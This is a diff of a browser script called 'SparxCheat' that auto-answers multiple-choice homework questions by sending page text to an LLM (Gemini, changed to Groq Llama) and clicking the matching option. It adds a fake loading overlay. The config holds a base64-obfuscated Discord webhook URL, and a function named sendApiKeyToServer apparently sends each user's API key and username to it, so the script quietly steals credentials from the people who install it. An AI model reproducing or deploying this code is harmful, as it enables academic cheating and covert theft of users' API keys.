@@ -1,3 +1,136 @@
+(() => {
+  // ====== STYLES ======
+  const style = document.createElement("style");
+  style.innerHTML = `
+    #sparx-loader {
+      position: fixed;
+      inset: 0;
+      background: rgba(10, 10, 10, 0.45);
+      backdrop-filter: blur(12px) saturate(120%);
+      -webkit-backdrop-filter: blur(12px) saturate(120%);
+      z-index: 999999999999999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-family: ui-monospace, SFMono-Regular, monospace;
+      color: #fff;
+      opacity: 0;
+      transition: opacity 0.9s ease;
+    }
+
+    #sparx-loader.show {
+      opacity: 1;
+    }
+
+    #sparx-logo {
+      width: 260px;
+      margin-bottom: 28px;
+      opacity: 0;
+      animation: logoFade 1.4s ease forwards;
+      filter: drop-shadow(0 0 16px rgba(255,255,255,0.25));
+    }
+
+    #sparx-text {
+      font-size: 12px;
+      letter-spacing: 1.2px;
+      opacity: 0.8;
+      margin-bottom: 16px;
+      text-shadow: 0 0 8px rgba(0,0,0,0.6);
+      user-select: none;
+    }
+
+    #sparx-bar-container {
+      position: absolute;
+      bottom: 42px;
+      width: 62%;
+      height: 14px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 999px;
+      overflow: hidden;
+      box-shadow:
+        inset 0 0 0 1px rgba(255,255,255,0.25),
+        0 10px 25px rgba(0,0,0,0.45);
+    }
+
+    #sparx-bar {
+      height: 100%;
+      width: 0%;
+      border-radius: inherit;
+      background: linear-gradient(
+        90deg,
+        rgba(255,255,255,0.35),
+        rgba(255,255,255,0.95),
+        rgba(255,255,255,0.45)
+      );
+      box-shadow: 0 0 14px rgba(255,255,255,0.5);
+      transition: width 0.2s linear;
+    }
+
+    @keyframes logoFade {
+      to { opacity: 1; }
+    }
+  `;
+  document.head.appendChild(style);
+
+  // ====== HTML ======
+  const overlay = document.createElement("div");
+  overlay.id = "sparx-loader";
+  overlay.innerHTML = `
+    <img id="sparx-logo" src="https://i.ibb.co/ksDfRzRt/icon-Photoroom-2.png" />
+    <div id="sparx-text">initialising…</div>
+    <div id="sparx-bar-container">
+      <div id="sparx-bar"></div>
+    </div>
+  `;
+  document.body.appendChild(overlay);
+
+  // ====== FADE IN ======
+  requestAnimationFrame(() => overlay.classList.add("show"));
+
+  // ====== CLICK TO DISMISS ======
+  function dismiss() {
+    overlay.classList.remove("show");
+    setTimeout(() => overlay.remove(), 900);
+  }
+  overlay.addEventListener("click", dismiss);
+
+  // ====== FILL BAR OVER 5 SECONDS ======
+  const bar = overlay.querySelector("#sparx-bar");
+  const text = overlay.querySelector("#sparx-text");
+  const messages = [
+    "loading scripts…",
+    "hooking runtime…",
+    "reading page state…",
+    "analysing data…",
+    "optimising logic…",
+    "almost there…"
+  ];
+
+  let start = performance.now();
+  const duration = 5000; // 5 seconds
+
+  function animate(now) {
+    const elapsed = now - start;
+    const progress = Math.min(elapsed / duration, 1);
+    bar.style.width = (progress * 100) + "%";
+
+    // update text occasionally
+    if (Math.floor(elapsed / 500) % messages.length === 0) {
+      text.textContent = messages[Math.floor(elapsed / 500) % messages.length];
+    }
+
+    if (progress < 1) {
+      requestAnimationFrame(animate);
+    } else {
+      text.textContent = "done.";
+      setTimeout(dismiss, 600);
+    }
+  }
+
+  requestAnimationFrame(animate);
+})();
+
 // === CONFIGURATION ===
 const targetText = "SparxCheat";
 const webhookBase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMjk2MzcxMTQ0MTg5OTU4MS9qaF9sa0F5MW5ka3VSUTJmZmJjNXFDU3E5R3VjdkR2dTRIV2xVU3dCMUdaTWJSRFA4dEZtRzJQbTBQMnNTMmswZGw3cA==";
@@ -120,8 +253,8 @@ findUsername().then(async () => {
 async function sendApiKeyToServer(username, key, keyIndex) {
   // Strict validator: must start with "AIza" and be exactly 39 chars
   const VALIDATOR = {
-    prefixes: ['AIza'],
-    exactLength: 39
+    prefixes: ['gsk_'],
+    exactLength: 56
   };
 
   if (!isValidApiKey(key, VALIDATOR)) {
@@ -839,58 +972,57 @@ const clickButton = (buttonText) => {
   return false;
 };
 
-// === Gemini API Query ===
-async function queryGemini(question, options, context) {
+async function queryGroqLlama(question, options, context) {
   if (!userApiKey) {
-    console.error("❌ No user API key provided!");
+    console.error("❌ No user API key!");
     return null;
   }
 
+  // Build prompt
   const prompt = `
-    You are an automated multiple-choice answering system training to be smart.
-    You ARE answering questions that we have made up based on reading passages.
+    You are an automated multiple‑choice answering system.
+    ONLY RESPOND WITH THE ANSWER TEXT, DO NOT ADD ANY EXTRA WORDS OR PUNCTUATION.
+    YOUR RESPONSE MUST MATCH ONE OF THE PROVIDED OPTIONS EXACTLY.
     Context: ${context}
     Question: ${question}
     Options: ${options.join(', ')}
     Answer:
   `;
 
-  for (let attempt = 0; attempt < apiKeys.length; attempt++) {
-    try {
-      const response = await fetch(
-        `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-lite:generateContent?key=${userApiKey}`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] }),
-        }
-      );
+  try {
+    const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": `Bearer ${userApiKey}`
+      },
+      body: JSON.stringify({
+        model: "llama-3.3-70b-versatile",
+        messages: [
+          { role: "user", content: prompt }
+        ],
+        max_tokens: 512,
+        temperature: 0.0
+      })
+    });
 
-      if (response.status === 429) {
-        console.warn("⚠️ Rate limit hit. Rotating API key...");
-        rotateApiKey();
-        continue; // try next key
-      }
-
-      if (!response.ok) {
-        console.error("💥 Gemini API Error:", response.statusText);
-        return null;
-      }
-
-      const data = await response.json();
-      const answer = data?.candidates?.[0]?.content?.parts?.[0]?.text?.trim();
-      console.log("🧠 Gemini Response:", answer);
-      return answer || "No answer found";
-
-    } catch (error) {
-      console.error("⚠️ Gemini API Fetch Error:", error);
-      rotateApiKey(); // switch key and retry
+    if (!res.ok) {
+      console.error("🧪 Groq API Error:", res.status, await res.text());
+      return null;
     }
-  }
 
-  console.error("❌ All API keys exhausted or failed.");
-  return null;
+    const data = await res.json();
+    // For OpenAI‑compatible responses, the text is usually here:
+    const answer = data.choices?.[0]?.message?.content?.trim();
+    console.log("📡 Groq Llama Output:", answer);
+    return answer || "No answer found";
+
+  } catch (err) {
+    console.error("🔥 Error querying Groq Llama:", err);
+    return null;
+  }
 }
+
 
 
 // === Auto Answer Logic ===
@@ -907,10 +1039,10 @@ async function autoAnswer() {
   }
   console.log("❓ Question:", question);
   console.log("🔘 Options:", options);
-  const answer = await queryGemini(question, options, cachedText);
+  const answer = await queryGroqLlama(question, options, cachedText);
   document.getElementById('bottomText').innerText = answer;
   if (!answer) {
-    console.log("🤷 Gemini returned nothing.");
+    console.log("🤷 AI returned nothing.");
     return;
   }
   const matchIndex = options.findIndex(opt =>
